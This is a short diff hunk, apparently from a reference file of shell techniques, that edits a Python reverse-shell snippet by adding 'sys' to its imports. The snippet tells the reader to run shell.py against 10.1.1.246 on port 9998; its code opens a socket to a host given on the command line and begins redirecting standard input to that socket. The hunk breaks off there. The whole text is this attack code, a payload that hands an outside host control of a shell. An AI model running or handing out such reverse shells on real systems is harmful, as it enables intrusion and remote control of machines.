@@ -9,7 +9,7 @@ functions:
         
         Create a shell.py script and run with python/3 shell.py 10.1.1.246 9998:
 
-        import socket,subprocess,os
+        import socket,subprocess,os,sys
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((sys.argv[1],sys.argv[2]))
         os.dup2(s.fileno(),0)
